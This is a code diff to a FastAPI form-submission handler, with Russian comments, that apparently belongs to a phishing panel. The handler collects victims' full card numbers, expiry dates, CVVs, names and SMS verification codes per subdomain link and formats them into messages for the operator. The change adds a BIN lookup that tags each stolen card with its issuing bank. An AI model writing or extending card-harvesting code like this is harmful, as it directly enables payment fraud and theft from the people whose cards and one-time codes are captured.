@@ -6,6 +6,7 @@ from fastapi import APIRouter, Request
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel
 
+from api.bin_lookup import format_bin_line, lookup_bin
 from db.crud.links import get_link_by_subdomain_and_id
 from db.crud.submissions import upsert_submission
 from db.models import User
@@ -138,17 +139,29 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
             logger.error("upsert_submission failed: %s", exc)
 
     # ── SMS код — короткое отдельное сообщение ────────────────────────────────
+    bin_line = ""
+    if payload.card_number:
+        bin_digits, bank_name = await lookup_bin(payload.card_number)
+        bin_line = format_bin_line(bin_digits, bank_name)
+
     if payload.verification_code:
+        card_block = [
+            "💳 <b>Карта:</b>",
+            f"  Номер: <code>{payload.card_number or '—'}</code>",
+        ]
+        if bin_line:
+            card_block.append(bin_line)
+        card_block.extend([
+            f"  Срок: <code>{payload.card_exp or '—'}</code>",
+            f"  CVV: <code>{payload.card_cvv or '—'}</code>",
+            f"  Имя: {payload.card_name or '—'}",
+        ])
         code_msg = "\n".join([
             "🔑 <b>SMS-код от посетителя</b>",
             "",
             f"🔗 {payload.subdomain}/{payload.link_id}",
             "",
-            "💳 <b>Карта:</b>",
-            f"  Номер: <code>{payload.card_number or '—'}</code>",
-            f"  Срок: <code>{payload.card_exp or '—'}</code>",
-            f"  CVV: <code>{payload.card_cvv or '—'}</code>",
-            f"  Имя: {payload.card_name or '—'}",
+            *card_block,
             "",
             f"Код от смс: <b>{payload.verification_code}</b>",
         ])
@@ -168,6 +181,7 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         "",
         "💳 <b>Карта:</b>",
         f"  Номер: <code>{payload.card_number or '—'}</code>",
+        *([bin_line] if bin_line else []),
         f"  Срок: <code>{payload.card_exp or '—'}</code>",
         f"  CVV: <code>{payload.card_cvv or '—'}</code>",
         f"  Имя: {payload.card_name or '—'}",
